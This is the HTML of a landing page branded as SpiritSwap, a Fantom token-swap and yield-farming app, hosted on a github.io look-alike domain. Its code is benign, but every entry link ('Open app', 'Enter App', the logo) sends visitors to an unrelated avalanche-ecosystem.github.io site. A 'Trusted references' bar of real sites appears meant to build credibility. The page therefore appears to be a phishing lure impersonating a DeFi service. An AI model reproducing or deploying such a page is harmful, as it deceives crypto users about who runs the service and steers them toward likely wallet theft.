<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SpiritSwap</title>
  <meta name="description" content="SpiritSwap swaps tokens and farms yield on the Fantom network from your own wallet.">
  <link rel="canonical" href="https://spiritswap-app.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F4EF">
  <meta property="og:type" content="website">
  <meta property="og:title" content="SpiritSwap">
  <meta property="og:description" content="SpiritSwap swaps tokens and farms yield on the Fantom network from your own wallet.">
  <meta property="og:url" content="https://spiritswap-app.github.io/">
  <meta property="og:image" content="https://spiritswap-app.github.io/favicon.png">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SpiritSwap">
  <meta name="twitter:description" content="SpiritSwap swaps tokens and farms yield on the Fantom network from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://spiritswap-app.github.io/#website",
        "url": "https://spiritswap-app.github.io/",
        "name": "SpiritSwap",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://spiritswap-app.github.io/#organization",
        "name": "SpiritSwap",
        "url": "https://spiritswap-app.github.io/",
        "logo": "https://spiritswap-app.github.io/favicon.png"
      },
      {
        "@type": "WebApplication",
        "@id": "https://spiritswap-app.github.io/#app",
        "name": "SpiritSwap",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://spiritswap-app.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="SpiritSwap home">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>SpiritSwap</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://ftmscan.com/" target="_blank" rel="nofollow noopener noreferrer">Fantom explorer</a>
      <a href="https://ethereum.org/defi/" target="_blank" rel="nofollow noopener noreferrer">DeFi guide</a>
      <a href="https://www.coingecko.com/en/coins/spiritswap" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <img class="hero-mark" src="spirit.png" width="64" height="64" alt="">
      <h1 id="page-title">SpiritSwap</h1>
      <p class="sub"><strong>SpiritSwap</strong> swaps tokens and farms yield on the Fantom network from your own wallet.</p>
    </section>

    <section class="swap-card" aria-label="Swap route preview">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img src="eth.png" width="28" height="28" alt="ETH">
            <span>ETH</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">→</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img src="usdc.png" width="28" height="28" alt="USDC">
            <span>USDC</span>
          </span>
        </div>
      </div>
      <a class="enter" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="foot">SpiritSwap &mdash; 2026</footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;
    button.addEventListener("click", function(){
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length !== 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
